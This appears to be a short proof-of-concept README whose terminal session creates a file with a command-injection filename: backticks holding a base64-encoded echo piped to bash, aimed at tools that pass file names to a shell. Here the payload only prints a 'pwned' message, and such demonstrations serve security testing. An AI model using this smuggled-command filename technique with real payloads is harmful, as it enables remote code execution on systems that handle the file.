# createfiles

```bash
└─$ gcc createfile.c -o createfile
                                                                                                                                                             
┌──(kali㉿kali)-[/tmp/rce]
└─$ ./createfile
[*] Target filename: poc.txt`{echo,ZWNobyAieW91IGhhdmUgcHduZWQgWytdISAi}|{base64,-d}|bash`
[*] Calling syscall(SYS_openat)...
[+] File created successfully! fd=3
[+] Wrote 9 bytes to file.
[+] File closed successfully.
[*] Done.
└─$ ls -la
total 36
-rwxrwxr-x  1 kali kali 16328 Aug 22 12:02  createfile
-rw-rw-r--  1 kali kali  1137 Aug 22 12:02  createfile.c
-rw-r--r--  1 kali kali     9 Aug 22 12:02 'poc.txt`{echo,ZWNobyAieW91IGhhdmUgcHduZWQgWytdISAi}|{base64,-d}|bash`'

```

